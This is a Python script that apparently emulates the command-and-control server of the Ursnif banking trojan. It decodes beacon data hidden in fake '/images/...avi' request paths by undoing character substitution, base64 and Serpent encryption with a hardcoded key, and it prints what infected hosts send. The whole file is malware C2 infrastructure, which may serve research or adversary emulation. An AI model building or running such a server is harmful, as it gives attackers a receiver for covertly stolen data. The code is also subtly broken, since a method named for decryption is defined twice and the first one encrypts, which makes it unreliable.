import random
import string
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

from base64 import b64encode, b64decode
from serpent import serpent_cbc_encrypt, serpent_cbc_decrypt


class C2Handler(BaseHTTPRequestHandler):
    serpent_key = b"10291029JSJUYNHG"

    def serpent_decrypt(self, data):
        return serpent_cbc_encrypt(self.serpent_key, data)

    def serpent_decrypt(self, data):
        return serpent_cbc_decrypt(self.serpent_key, data).decode("utf-8")

    def decode_payload(self, data):
        # remove file format postfix and "/images/" prefix
        data = data.rsplit(".", 1)[0]
        if data.startswith("/images/"):
            data = data[len("/images/"):]

        # remove the random "/" characters, and add back the encoded "+" and "/"
        data = data.replace("/", "")
        data = data.replace("_2B", "+")
        data = data.replace("_2F", "/")

        # decode from base 64
        data = b64decode(data + "==")

        # decrypt with serpent
        return self.serpent_decrypt(data)

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("<html><head><title>Server</title></head>", "utf-8"))
        msg = "Ursnif Command and Control"
        msg = b64encode(msg.encode("ascii"))
        self.wfile.write(bytes("<body><p>" + msg.decode("utf-8") + "</p></body></html>", "utf-8"))

        if self.path.endswith(".avi"):
            print(self.decode_payload(self.path))

class C2Server():
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.webserver = HTTPServer((host, port), C2Handler)

    def run(self):
        try:
            self.webserver.serve_forever()
        except KeyboardInterrupt:
            pass
            
server = C2Server("192.168.1.101", 80)
server.run()
